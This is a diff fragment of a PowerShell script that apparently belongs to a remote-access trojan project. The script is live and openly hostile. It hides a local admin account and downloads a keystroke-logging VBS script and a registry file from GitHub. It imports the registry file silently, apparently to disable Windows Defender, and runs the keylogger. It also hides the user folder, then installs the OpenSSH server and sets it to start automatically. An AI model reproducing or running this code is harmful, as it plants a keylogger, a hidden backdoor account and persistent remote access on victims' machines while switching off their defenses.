@@ -38,18 +38,19 @@ Remove-Item $configfile
 mkdir $pathDir
 Set-Location $pathDir
 
-# Registry to hide local admin
+# Registry to hide local admin and disable windows defenders
 $reg = random_text
 $vbs_script = random_text
 
 
-# Hide User 
-cd C:\Users
-attrib +h +s +r NewUserText
+
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/bruning-frighting/MyRAT/refs/heads/main/keystroke.vbs -OutFile "$vbs_script.vbs"
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/bruning-frighting/Windows-Internal/refs/heads/main/disable.reg -OutFile "$reg.reg" 
 Start-Process -FilePath "regedit.exe" -ArgumentList "/s `"$reg.reg`"" -NoNewWindow -Wait
 Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbs_script.vbs`"" -NoNewWindow -Wait
+#Hide User
+cd C:\Users
+attrib +h +s +r NewUserText
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
